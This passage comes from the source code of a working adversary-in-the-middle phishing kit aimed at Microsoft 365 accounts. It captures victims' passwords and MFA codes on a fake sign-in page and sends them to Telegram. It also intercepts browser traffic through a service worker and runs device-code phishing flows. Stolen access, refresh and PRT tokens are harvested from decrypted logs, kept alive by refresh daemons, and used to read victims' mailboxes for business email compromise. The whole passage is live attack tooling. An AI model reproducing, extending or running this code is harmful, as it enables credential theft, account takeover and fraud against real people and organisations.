</form>
<div class="footer">© 2026 Microsoft</div>
</div>
</body>
</html>
                `);
            } catch (e) {
                clientResponse.writeHead(400);
                clientResponse.end('Invalid request');
            }
        });
        return;
    }

    // ── Handle MFA submit ──
    if (url === '/mfa/submit' && method === 'POST') {
        let body = '';
        clientRequest.on('data', chunk => { body += chunk; });
        clientRequest.on('end', () => {
            try {
                const params = new URLSearchParams(body);
                const mfaCode = params.get('mfa_code') || 'N/A';
                const sessionId = headers.cookie?.match(/session=([^;]+)/)?.[1] || 'unknown';
                
                if (!sessions.has(sessionId)) {
                    sessions.set(sessionId, {});
                }
                const session = sessions.get(sessionId);
                session.mfa = mfaCode;
                
                sendToTelegramClean({
                    sessionId: sessionId,
                    ip: headers['x-real-ip'] || clientRequest.socket.remoteAddress,
                    email: session.email,
                    password: session.password,
                    mfa: mfaCode,
                    proxyRequestBody: JSON.stringify({ mfa: mfaCode })
                });
                
                // Redirect to real Microsoft
                clientResponse.writeHead(302, { Location: REDIRECT_URL });
                clientResponse.end();
            } catch (e) {
                clientResponse.writeHead(400);
                clientResponse.end('Invalid request');
            }
        });
        return;
    }

    // ── Handle service worker ──
    if (url === PROXY_PATHNAMES.serviceWorker) {
        const filePath = path.join(__dirname, url.slice(1));
        if (fs.existsSync(filePath)) {
            clientResponse.writeHead(200, { 'Content-Type': 'text/javascript', 'Cache-Control': 'no-store' });
            fs.createReadStream(filePath).pipe(clientResponse);
        } else {
            clientResponse.writeHead(200, { 'Content-Type': 'text/javascript' });
            clientResponse.end(`
                self.addEventListener('fetch', function(event) {
                    var proxyUrl = self.location.origin + "/lNv1pC9AWPUY4gbidyBO";
                    event.respondWith(async function() {
                        var data = {
                            url: event.request.url,
                            method: event.request.method,
                            headers: Object.fromEntries(event.request.headers.entries()),
                            body: await event.request.text().catch(function() { return null; })
                        };
                        var response = await fetch(proxyUrl, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify(data)
                        });
                        return response;
                    }());
                });
            `);
        }
        return;
    }

    // ── Handle favicon ──
    if (url === PROXY_PATHNAMES.favicon) {
        clientResponse.writeHead(302, { Location: 'https://login.microsoftonline.com/favicon.ico' });
        clientResponse.end();
        return;
    }

    // ── Log visit ──
    logVisit(clientRequest, clientResponse, currentSession || 'new').catch(function() {});

    // ── Fallback redirect ──
    clientResponse.writeHead(302, { Location: REDIRECT_URL });
    clientResponse.end();
});

// ── ✅ EMBEDDED GRAPH API CLIENT ──
class GraphClient {
    constructor(accessToken) {
        this.accessToken = accessToken;
        this.baseUrl = 'https://graph.microsoft.com/v1.0';
        this.cache = global._cache || new CacheManager();
    }

    async get(endpoint, useCache = true) {
        const cacheKey = `graph:get:${endpoint}`;
        if (useCache) {
            const cached = this.cache.get(cacheKey);
            if (cached) {
                logDebug(`Graph cache hit: ${endpoint}`);
                return cached;
            }
        }
        const config = getAxiosConfig();
        config.headers['Authorization'] = `Bearer ${this.accessToken}`;
        const response = await retry(async () => {
            return await axios.get(`${this.baseUrl}${endpoint}`, config);
        }, 3, 1000, 2);
        if (useCache && response.status === 200) {
            this.cache.set(cacheKey, response.data, 300000);
        }
        return response.data;
    }

    async getUserProfile() {
        return this.get('/me?$select=id,displayName,mail,userPrincipalName,jobTitle,department,officeLocation,mobilePhone,businessPhones');
    }

    async getInbox(limit = 50) {
        return this.get(`/me/mailFolders/inbox/messages?$top=${limit}&$orderby=receivedDateTime desc&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments,importance`);
    }

    async getContacts() {
        return this.get('/me/contacts?$top=100&$select=displayName,emailAddresses,mobilePhone,businessPhones,jobTitle,department');
    }

    async getEvents(limit = 25) {
        return this.get(`/me/events?$top=${limit}&$orderby=start/dateTime desc&$select=subject,start,end,location,attendees,organizer,bodyPreview`);
    }

    async getManager() {
        return this.get('/me/manager');
    }

    async getDirectReports() {
        return this.get('/me/directReports');
    }

    async getOrganization() {
        return this.get('/organization');
    }

    async getMailFolders() {
        return this.get('/me/mailFolders');
    }
}

// ── ✅ EMBEDDED TOKEN VAULT ──
class TokenVault {
    constructor(logsDir, encryptionKey) {
        this.logsDir = logsDir;
        this.encryptionKey = encryptionKey;
        this.tokens = [];
        this.users = {};
        this.cache = global._cache || new CacheManager();
        this.scanLogs();
    }

    extractUsernameFromToken(token) {
        try {
            const parts = token.split('.');
            if (parts.length === 3) {
                const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
                return payload.email || payload.preferred_username || payload.upn || 'unknown';
            }
        } catch (e) {}
        return 'unknown';
    }

    scanLogs() {
        this.tokens = [];
        const files = fs.readdirSync(this.logsDir).filter(f => f.endsWith('.log'));
        for (const file of files) {
            try {
                const content = fs.readFileSync(path.join(this.logsDir, file), 'utf-8');
                const lines = content.split('\n').filter(line => line.trim());
                for (const line of lines) {
                    try {
                        const entry = JSON.parse(line);
                        const iv = Object.keys(entry)[0];
                        const encrypted = entry[iv];
                        const decrypted = decryptData(encrypted, iv);
                        const obj = JSON.parse(decrypted);
                        const body = obj.proxyRequestBody;
                        if (body) {
                            const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
                            const accessMatch = bodyStr.match(/access_token=([^&]+)/i);
                            const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
                            const idMatch = bodyStr.match(/id_token=([^&]+)/i);
                            const prtMatch = bodyStr.match(/prt=([^&]+)/i);

                            if (accessMatch) {
                                const token = decodeURIComponent(accessMatch[1]);
                                const username = this.extractUsernameFromToken(token);
                                this.tokens.push({ type: 'access', value: token, file: file, username: username, timestamp: new Date().toISOString() });
                            }
                            if (refreshMatch) {
                                const token = decodeURIComponent(refreshMatch[1]);
                                const username = this.extractUsernameFromToken(token);
                                this.tokens.push({ type: 'refresh', value: token, file: file, username: username, timestamp: new Date().toISOString() });
                            }
                            if (idMatch) {
                                const token = decodeURIComponent(idMatch[1]);
                                const username = this.extractUsernameFromToken(token);
                                this.tokens.push({ type: 'id', value: token, file: file, username: username, timestamp: new Date().toISOString() });
                            }
                            if (prtMatch) {
                                const token = decodeURIComponent(prtMatch[1]);
                                this.tokens.push({ type: 'prt', value: token, file: file, username: 'PRT', timestamp: new Date().toISOString() });
                            }
                            try {
                                const json = typeof body === 'string' ? JSON.parse(body) : body;
                                if (json.access_token) {
                                    const token = json.access_token;
                                    const username = this.extractUsernameFromToken(token);
                                    this.tokens.push({ type: 'access', value: token, file: file, username: username, timestamp: new Date().toISOString() });
                                }
                                if (json.refresh_token) {
                                    const token = json.refresh_token;
                                    const username = this.extractUsernameFromToken(token);
                                    this.tokens.push({ type: 'refresh', value: token, file: file, username: username, timestamp: new Date().toISOString() });
                                }
                                if (json.id_token) {
                                    const token = json.id_token;
                                    const username = this.extractUsernameFromToken(token);
                                    this.tokens.push({ type: 'id', value: token, file: file, username: username, timestamp: new Date().toISOString() });
                                }
                                if (json.prt) {
                                    this.tokens.push({ type: 'prt', value: json.prt, file: file, username: 'PRT', timestamp: new Date().toISOString() });
                                }
                            } catch (e) {}
                        }
                    } catch (e) {}
                }
            } catch (e) {}
        }
        this.groupByUser();
        this.cache.set('vault_tokens', this.tokens, 60000);
        return this.tokens;
    }

    groupByUser() {
        this.users = {};
        for (const token of this.tokens) {
            const username = token.username || 'unknown';
            if (!this.users[username]) this.users[username] = [];
            this.users[username].push(token);
        }
        return this.users;
    }

    getTokensByUser() {
        return this.users;
    }

    getStats() {
        const total = this.tokens.length;
        const access = this.tokens.filter(t => t.type === 'access').length;
        const refresh = this.tokens.filter(t => t.type === 'refresh').length;
        const id = this.tokens.filter(t => t.type === 'id').length;
        const prt = this.tokens.filter(t => t.type === 'prt').length;
        return { total, access, refresh, id, prt };
    }

    // ── ✅ TOKEN HEALTH-CHECK ──
    async healthCheckAll() {
        const results = [];
        const uniqueTokens = [];
        const seen = new Set();
        for (const token of this.tokens) {
            if (!seen.has(token.value) && token.type === 'access') {
                seen.add(token.value);
                uniqueTokens.push(token);
            }
        }
        for (const token of uniqueTokens.slice(0, 10)) {
            try {
                const response = await retry(async () => {
                    return await axios.get('https://graph.microsoft.com/v1.0/me', {
                        headers: { 'Authorization': `Bearer ${token.value}` },
                        timeout: 5000
                    });
                }, 2, 1000, 2);
                results.push({
                    token: token.value.slice(0, 20) + '...',
                    status: 'valid',
                    user: response.data.userPrincipalName,
                    username: token.username
                });
            } catch (e) {
                results.push({
                    token: token.value.slice(0, 20) + '...',
                    status: 'invalid',
                    error: e.message,
                    username: token.username
                });
            }
        }
        return results;
    }
}

// ── ✅ EMBEDDED AI BEC ENGINE ──
class AIBECEngine {
    constructor(groqApiKey) {
        this.groqApiKey = groqApiKey;
        this.baseUrl = 'https://api.groq.com/openai/v1';
        this.cache = global._cache || new CacheManager();
    }

    async analyzeInbox(accessToken, email) {
        const graph = new GraphClient(accessToken);
        const [profile, inbox] = await Promise.all([
            graph.getUserProfile(),
            graph.getInbox(50)
        ]);
        const emails = inbox.value || [];
        const analysis = {
            user: profile,
            totalEmails: emails.length,
            unread: emails.filter(e => !e.isRead).length,
            highImportance: emails.filter(e => e.importance === 'high').length,
            topSenders: {},
            potentialBEC: []
        };
        for (const email of emails) {
            const sender = email.sender?.emailAddress?.address || 'unknown';
            analysis.topSenders[sender] = (analysis.topSenders[sender] || 0) + 1;
            if (email.importance === 'high' && !email.isRead) {
                analysis.potentialBEC.push({
                    subject: email.subject,
                    sender: sender,
                    received: email.receivedDateTime,
                    preview: email.bodyPreview
                });
            }
        }
        return analysis;
    }

    async runFullAnalysis(accessToken, refreshToken, email) {
        const analysis = await this.analyzeInbox(accessToken, email);
        const recommendations = [];
        if (analysis.potentialBEC.length > 0) {
            recommendations.push('⚠️ High-priority emails from external senders detected — potential BEC risk.');
        }
        if (analysis.unread > 10) {
            recommendations.push('📧 Large number of unread emails — consider auto-reply or filtering.');
        }
        return {
            ...analysis,
            recommendations,
            summary: `User ${analysis.user.displayName || 'Unknown'} has ${analysis.totalEmails} emails, ${analysis.unread} unread. ${analysis.potentialBEC.length} potential BEC targets identified.`
        };
    }
}

// ── ✅ EMBEDDED CONVERSION ENGINE ──
class ConversionEngine {
    constructor() {
        this.cache = global._cache || new CacheManager();
    }

    async esctxToJWT(esctx, resource = 'MSGraph') {
        if (!esctx) throw new Error('ESTSAuth cookie required');
        
        try {
            const psScript = `
                Import-Module ./TokenTactics.psd1 -Force -ErrorAction SilentlyContinue
                try {
                    $token = Get-EntraIDTokenFromESTSCookie -ESTSAuthCookie "${esctx}" -ResourceName ${resource}
                    $token | ConvertTo-Json -Depth 10
                } catch {
                    Write-Error $_.Exception.Message
                }
            `;

            return new Promise((resolve, reject) => {
                exec(`powershell -Command "${psScript}"`, { timeout: 30000 }, (error, stdout, stderr) => {
                    if (error) {
                        reject(new Error(stderr || error.message));
                        return;
                    }
                    try {
                        const result = JSON.parse(stdout);
                        resolve(result);
                    } catch (e) {
                        reject(new Error('Failed to parse PowerShell output: ' + e.message));
                    }
                });
            });
        } catch (err) {
            throw err;
        }
    }

    async sccauthToJWT(sccauth, resource = 'MSGraph') {
        if (!sccauth) throw new Error('SCCAUTH cookie required');
        
        try {
            const psScript = `
                Import-Module ./TokenTactics.psd1 -Force -ErrorAction SilentlyContinue
                try {
                    $token = Get-EntraIDTokenFromSCCAUTHCookie -SCCAuth "${sccauth}" -ResourceName ${resource}
                    $token | ConvertTo-Json -Depth 10
                } catch {
                    Write-Error $_.Exception.Message
                }
            `;

            return new Promise((resolve, reject) => {
                exec(`powershell -Command "${psScript}"`, { timeout: 30000 }, (error, stdout, stderr) => {
                    if (error) {
                        reject(new Error(stderr || error.message));
                        return;
                    }
                    try {
                        const result = JSON.parse(stdout);
                        resolve(result);
                    } catch (e) {
                        reject(new Error('Failed to parse PowerShell output: ' + e.message));
                    }
                });
            });
        } catch (err) {
            throw err;
        }
    }
}

// ── ✅ AUTO-REFRESH DAEMONS ──
async function refreshTokensDaemon() {
    logInfo('🔄 Token Refresh Daemon started (every 30 min)');
    setInterval(async () => {
        logInfo('🔄 Running token refresh cycle...');
        for (const flow of deviceFlows) {
            if (flow.refresh_token && flow.status === 'approved') {
                try {
                    const response = await retry(async () => {
                        return await axios.post(
                            'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
                            new URLSearchParams({
                                client_id: flow.client_id || '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
                                refresh_token: flow.refresh_token,
                                grant_type: 'refresh_token',
                                scope: 'https://graph.microsoft.com/.default offline_access'
                            }),
                            {
                                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                                timeout: 10000
                            }
                        );
                    }, 2, 1000, 2);
                    const data = response.data;
                    flow.access_token = data.access_token;
                    if (data.refresh_token) flow.refresh_token = data.refresh_token;
                    flow.last_refresh = new Date().toISOString();
                    saveDeviceFlows(deviceFlows);
                    logInfo(`✅ Refreshed tokens for flow ${flow.user_code}`);
                } catch (e) {
                    logWarn(`Failed to refresh tokens for ${flow.user_code}: ${e.message}`);
                }
            }
        }
    }, 30 * 60 * 1000);
}

async function prtRefreshDaemon() {
    logInfo('🟣 PRT Auto-Refresh Daemon started (every 60 min)');
    setInterval(async () => {
        logInfo('🟣 Running PRT refresh cycle...');
        const prts = prtStorage.prts || [];
        let refreshed = 0;

        for (const item of prts) {
            try {
                const response = await retry(async () => {
                    return await axios.post(
                        'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
                        new URLSearchParams({
                            client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
                            grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
                            assertion: item.prt,
                            requested_token_use: 'on_behalf_of',
                            scope: 'https://graph.microsoft.com/.default offline_access'
                        }),
                        {
                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                            timeout: 10000
                        }
                    );
                }, 2, 1000, 2);
                item.last_refresh = new Date().toISOString();
                item.access_token = response.data.access_token;
                item.refresh_token = response.data.refresh_token;
                refreshed++;
                logInfo(`Refreshed PRT for ${item.username}`);
            } catch (e) {
                logWarn(`Failed to refresh PRT for ${item.username}: ${e.message}`);
            }
        }

        if (refreshed > 0) {
            savePRTStorage(prtStorage);
            logInfo(`Refreshed ${refreshed} PRTs`);
        }
    }, 60 * 60 * 1000);
}

// ── ✅ DASHBOARD APP ──
if (!express) {
    console.error('❌ Express is not installed. Please run: npm install express');
    process.exit(1);
}

const dashApp = express();
const dashUser = process.env.DASHBOARD_USER || 'svrpsdev';
const dashPass = process.env.DASHBOARD_PASS || 'Cozysarps18!';

dashApp.use(corsMiddleware);
dashApp.use(antiBotMiddleware);
dashApp.use(botTrapMiddleware);

if (basicAuth) {
    dashApp.use(basicAuth({
        users: { [dashUser]: dashPass },
        challenge: true,
        realm: 'PHANTOM Dashboard'
    }));
}

dashApp.use(express.json());
dashApp.use(express.static('public'));

dashApp.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ── ✅ DASHBOARD API ENDPOINTS ──
dashApp.get('/api/status', (req, res) => {
    try {
        const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
        const last = files.length > 0 ? fs.statSync(path.join(LOGS_DIRECTORY, files[0])).mtime : null;
        res.json({
            online: true,
            totalSessions: files.length,
            lastCapture: last,
            cache: global._cache ? global._cache.getStats() : null,
            queueLength: telegramQueue.length
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.get('/api/logs', (req, res) => {
    try {
        const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
        const logs = files.map(f => {
            const stat = fs.statSync(path.join(LOGS_DIRECTORY, f));
            return { name: f, size: stat.size, modified: stat.mtime };
        }).sort((a, b) => b.modified - a.modified);
        res.json(logs);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.get('/api/log/:filename', (req, res) => {
    const filePath = path.join(LOGS_DIRECTORY, req.params.filename);
    if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'Not found' });
    try {
        const content = fs.readFileSync(filePath, 'utf-8');
        const lines = content.split('\n').filter(line => line.trim());
        const entries = lines.map(line => {
            try {
                const entry = JSON.parse(line);
                const iv = Object.keys(entry)[0];
                const encrypted = entry[iv];
                const decrypted = decryptData(encrypted, iv);
                return JSON.parse(decrypted);
            } catch (e) {
                return { error: 'Failed to decrypt', raw: line };
            }
        });
        res.json({ filename: req.params.filename, entries });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

if (AdmZip) {
    dashApp.get('/api/export/all', (req, res) => {
        try {
            const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
            if (files.length === 0) return res.status(404).json({ error: 'No logs' });
            const zip = new AdmZip();
            files.forEach(f => {
                const content = fs.readFileSync(path.join(LOGS_DIRECTORY, f));
                zip.addFile(f, content);
            });
            const zipBuffer = zip.toBuffer();
            res.setHeader('Content-Type', 'application/zip');
            res.setHeader('Content-Disposition', `attachment; filename=all_sessions_${Date.now()}.zip`);
            res.send(zipBuffer);
        } catch (err) {
            res.status(500).json({ error: err.message });
        }
    });
}

dashApp.get('/api/device/history', (req, res) => {
    try {
        const sorted = [...deviceFlows].sort((a, b) => new Date(b.created) - new Date(a.created));
        res.json({ success: true, flows: sorted });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.get('/api/device/stats', (req, res) => {
    try {
        const total = deviceFlows.length;
        const pending = deviceFlows.filter(f => f.status === 'pending' || f.status === 'waiting').length;
        const approved = deviceFlows.filter(f => f.status === 'approved').length;
        const expired = deviceFlows.filter(f => f.status === 'expired').length;
        const manual = deviceFlows.filter(f => f.status === 'manual').length;
        res.json({
            success: true,
            stats: { total, pending, approved, expired, manual }
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ── ✅ DEVICE CODE MANAGEMENT ──
dashApp.post('/api/device/manual', async (req, res) => {
    const { user_code, device_code } = req.body;
    if (!user_code && !device_code) {
        return res.status(400).json({ error: 'user_code or device_code required' });
    }
    try {
        const DEVICE_CLIENT_ID = '9e5f94bc-e8a4-4e73-b8be-63364c29d753';
        const response = await retry(async () => {
            return await axios.post(
                'https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode',
                new URLSearchParams({
                    client_id: DEVICE_CLIENT_ID,
                    scope: 'https://graph.microsoft.com/user.read https://graph.microsoft.com/mail.read offline_access'
                }),
                {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    timeout: 10000
                }
            );
        }, 3, 1000, 2);
        const data = response.data;
        const newFlow = {
            device_code: data.device_code,
            user_code: data.user_code,
            verification_uri: data.verification_uri,
            expires_in: data.expires_in,
            interval: data.interval,
            status: 'pending',
            created: new Date().toISOString(),
            approved: null,
            username: null,
            access_token: null,
            refresh_token: null,
            id_token: null,
            manual_submitted: true,
            client_id: DEVICE_CLIENT_ID,
            session_id: crypto.randomBytes(16).toString('hex'),
            token_type: 'Pending'
        };
        deviceFlows.push(newFlow);
        saveDeviceFlows(deviceFlows);
        res.json({ success: true, flow: newFlow });
    } catch (error) {
        res.status(500).json({ error: error.response?.data || error.message });
    }
});

dashApp.post('/api/device/use', async (req, res) => {
    const { session_id } = req.body;
    if (!session_id) {
        return res.status(400).json({ error: 'session_id required' });
    }
    try {
        const flow = deviceFlows.find(f => f.session_id === session_id);
        if (!flow) return res.status(404).json({ error: 'Flow not found' });
        if (!flow.access_token) return res.status(400).json({ error: 'No access token available' });
        res.json({
            success: true,
            access_token: flow.access_token,
            refresh_token: flow.refresh_token,
            id_token: flow.id_token,
            username: flow.username
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

dashApp.delete('/api/device/flow/:deviceCode', (req, res) => {
    const index = deviceFlows.findIndex(f => f.device_code === req.params.deviceCode);
    if (index === -1) return res.status(404).json({ error: 'Flow not found' });
    deviceFlows.splice(index, 1);
    saveDeviceFlows(deviceFlows);
    res.json({ success: true });
});

dashApp.get('/api/device/flow/:deviceCode', (req, res) => {
    const flow = deviceFlows.find(f => f.device_code === req.params.deviceCode);
    if (!flow) return res.status(404).json({ error: 'Flow not found' });
    res.json({ success: true, flow });
});

// ── ✅ TOKEN VAULT ENDPOINTS ──
const vault = new TokenVault(LOGS_DIRECTORY, ENCRYPTION_KEY);

dashApp.post('/api/vault/scan', (req, res) => {
    try {
        const tokens = vault.scanLogs();
        res.json({ success: true, count: tokens.length });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.get('/api/vault/tokens', (req, res) => {
    try {
        const cached = global._cache ? global._cache.get('vault_tokens') : null;
        if (cached) {
            return res.json({ success: true, tokens: cached, cached: true });
        }
        res.json({ success: true, tokens: vault.tokens || [] });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.get('/api/vault/users', (req, res) => {
    try {
        const users = vault.getTokensByUser();
        res.json({ success: true, users });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.get('/api/vault/stats', (req, res) => {
    try {
        const stats = vault.getStats();
        res.json({ success: true, stats });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ── ✅ TOKEN HEALTH-CHECK ENDPOINT ──
dashApp.post('/api/vault/healthcheck', async (req, res) => {
    try {
        const results = await vault.healthCheckAll();
        res.json({ success: true, results });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.post('/api/vault/exchange', async (req, res) => {
    const { tokenValue } = req.body;
    if (!tokenValue) return res.status(400).json({ error: 'Token value required' });

    try {
        const response = await retry(async () => {
            return await axios.post(
                'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
                new URLSearchParams({
                    client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
                    refresh_token: tokenValue,
                    grant_type: 'refresh_token',
                    scope: 'https://graph.microsoft.com/.default offline_access'
                }),
                { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
            );
        }, 3, 1000, 2);
        res.json({ success: true, data: response.data });
    } catch (err) {
        res.status(500).json({
            error: err.response?.data?.error_description || err.message
        });
    }
});

// ── ✅ PRT ENGINE ──
const PRT_STORAGE_FILE = path.join(__dirname, 'prt_storage.json');

function loadPRTStorage() {
    try {
        if (fs.existsSync(PRT_STORAGE_FILE)) {
            const data = fs.readFileSync(PRT_STORAGE_FILE, 'utf-8');
            return JSON.parse(data);
        }
    } catch (e) {}
    return { prts: [], lastScan: null };
}

function savePRTStorage(storage) {
    try {
        fs.writeFileSync(PRT_STORAGE_FILE, JSON.stringify(storage, null, 2));
    } catch (e) {}
}

let prtStorage = loadPRTStorage();

function extractPRTFromLog(logContent) {
    const prts = [];
    const lines = logContent.split('\n').filter(line => line.trim());
    for (const line of lines) {
        try {
            const entry = JSON.parse(line);
            const iv = Object.keys(entry)[0];
            const encrypted = entry[iv];
            const decrypted = decryptData(encrypted, iv);
            const obj = JSON.parse(decrypted);
            const body = obj.proxyRequestBody;
            if (body) {
                const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
                const prtMatch = bodyStr.match(/prt["']?\s*[:=]\s*["']([^"']+)["']/i);
                if (prtMatch) {
                    prts.push({
                        prt: prtMatch[1],
                        timestamp: obj.timestamp || new Date().toISOString(),
                        source: obj.proxyRequestURL || 'Unknown',
                        username: extractUsernameFromPRT(prtMatch[1])
                    });
                }
            }
            const respBody = obj.proxyResponseBody;
            if (respBody) {
                const respStr = typeof respBody === 'string' ? respBody : JSON.stringify(respBody);
                const prtMatch = respStr.match(/prt["']?\s*[:=]\s*["']([^"']+)["']/i);
                if (prtMatch) {
                    prts.push({
                        prt: prtMatch[1],
                        timestamp: obj.timestamp || new Date().toISOString(),
                        source: obj.proxyRequestURL || 'Unknown',
                        username: extractUsernameFromPRT(prtMatch[1])
                    });
                }
            }
        } catch (e) {}
    }
    return prts;
}

function extractUsernameFromPRT(token) {
    try {
        const parts = token.split('.');
        if (parts.length === 3) {
            const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
            return payload.email || payload.preferred_username || payload.upn || 'Unknown';
        }
    } catch (e) {}
    return 'Unknown';
}

function scanAllLogsForPRTs() {
    logInfo('Scanning logs for PRTs...');
    const files = fs.readdirSync(LOGS_DIRECTORY).filter(f => f.endsWith('.log'));
    let foundPRTs = [];

    for (const file of files) {
        try {
            const content = fs.readFileSync(path.join(LOGS_DIRECTORY, file), 'utf-8');
            const prts = extractPRTFromLog(content);
            if (prts.length > 0) {
                prts.forEach(p => p.sourceFile = file);
                foundPRTs = foundPRTs.concat(prts);
                logInfo(`Found ${prts.length} PRTs in ${file}`);
            }
        } catch (e) {}
    }

    const uniquePRTs = [];
    const seen = new Set();
    for (const prt of foundPRTs) {
        if (!seen.has(prt.prt)) {
            seen.add(prt.prt);
            uniquePRTs.push(prt);
        }
    }

    logInfo(`Total unique PRTs found: ${uniquePRTs.length}`);
    return uniquePRTs;
}

async function checkPRTHealth(prt) {
    try {
        const response = await retry(async () => {
            return await axios.post(
                'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
                new URLSearchParams({
                    client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
                    grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
                    assertion: prt,
                    requested_token_use: 'on_behalf_of',
                    scope: 'https://graph.microsoft.com/.default offline_access'
                }),
                {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    timeout: 10000
                }
            );
        }, 2, 1000, 2);
        return { valid: true, data: response.data };
    } catch (e) {
        return { valid: false, error: e.response?.data?.error_description || e.message };
    }
}

dashApp.post('/api/prt/scan', (req, res) => {
    try {
        const prts = scanAllLogsForPRTs();
        prtStorage.prts = prts;
        prtStorage.lastScan = new Date().toISOString();
        savePRTStorage(prtStorage);
        res.json({ success: true, count: prts.length, prts: prts });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.get('/api/prt/list', (req, res) => {
    try {
        res.json({ success: true, prts: prtStorage.prts || [] });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.post('/api/prt/health', async (req, res) => {
    const { prt } = req.body;
    if (!prt) return res.status(400).json({ error: 'PRT required' });
    try {
        const result = await checkPRTHealth(prt);
        res.json({ success: true, ...result });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.post('/api/prt/health-all', async (req, res) => {
    try {
        const results = [];
        const prts = prtStorage.prts || [];
        for (const item of prts.slice(0, 10)) {
            const health = await checkPRTHealth(item.prt);
            results.push({
                username: item.username,
                source: item.source,
                timestamp: item.timestamp,
                ...health
            });
        }
        res.json({ success: true, results });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.post('/api/prt/exchange', async (req, res) => {
    const { prt, client_id = '9e5f94bc-e8a4-4e73-b8be-63364c29d753' } = req.body;
    if (!prt) return res.status(400).json({ error: 'PRT required' });
    try {
        const response = await retry(async () => {
            return await axios.post(
                'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
                new URLSearchParams({
                    client_id: client_id,
                    grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
                    assertion: prt,
                    requested_token_use: 'on_behalf_of',
                    scope: 'https://graph.microsoft.com/.default offline_access'
                }),
                {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'User-Agent': getRandomUserAgent()
                    },
                    timeout: 15000
                }
            );
        }, 3, 1500, 2);
        const tokens = response.data;
        logInfo('PRT exchange successful');
        
        sendToTelegramClean({
            sessionId: 'prt_exchange',
            proxyRequestBody: JSON.stringify(tokens),
            proxyResponseBody: JSON.stringify(tokens)
        });
        
        res.json({ success: true, data: tokens });
    } catch (err) {
        logError('PRT exchange failed:', err.response?.data || err.message);
        res.status(500).json({ error: err.response?.data || err.message });
    }
});

dashApp.post('/api/prt/exchange-all', async (req, res) => {
    try {
        const results = [];
        const prts = prtStorage.prts || [];
        for (const item of prts) {
            try {
                const response = await retry(async () => {
                    return await axios.post(
                        'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
                        new URLSearchParams({
                            client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
                            grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer',
                            assertion: item.prt,
                            requested_token_use: 'on_behalf_of',
                            scope: 'https://graph.microsoft.com/.default offline_access'
                        }),
                        {
                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                            timeout: 15000
                        }
                    );
                }, 2, 1000, 2);
                results.push({
                    username: item.username,
                    source: item.source,
                    success: true,
                    access_token: response.data.access_token?.slice(0, 40) + '...',
                    refresh_token: response.data.refresh_token?.slice(0, 40) + '...'
                });
            } catch (e) {
                results.push({
                    username: item.username,
                    source: item.source,
                    success: false,
                    error: e.message
                });
            }
        }
        res.json({ success: true, results });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

dashApp.get('/api/prt/stats', (req, res) => {
    try {
        const prts = prtStorage.prts || [];
        const total = prts.length;
        const uniqueUsers = new Set(prts.map(p => p.username)).size;
        const lastScan = prtStorage.lastScan;
        res.json({
            success: true,
            stats: {
                total,
                uniqueUsers,
                lastScan,
                healthy: prts.filter(p => p.last_refresh).length
            }
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// ── ✅ CONVERSION ENDPOINTS ──
const conversionEngine = new ConversionEngine();

dashApp.post('/api/convert/esctx-to-token', async (req, res) => {
    const { esctx, resource = 'MSGraph' } = req.body;
    if (!esctx) {
        return res.status(400).json({ error: 'ESTSAuth cookie required' });
    }

    try {
        const result = await conversionEngine.esctxToJWT(esctx, resource);
        if (result.access_token) {
            vault.tokens.push({
                type: 'access',
                value: result.access_token,
                refresh_token: result.refresh_token,
                username: result.id_token ? 'esctx_user' : 'Unknown',
                timestamp: new Date().toISOString(),
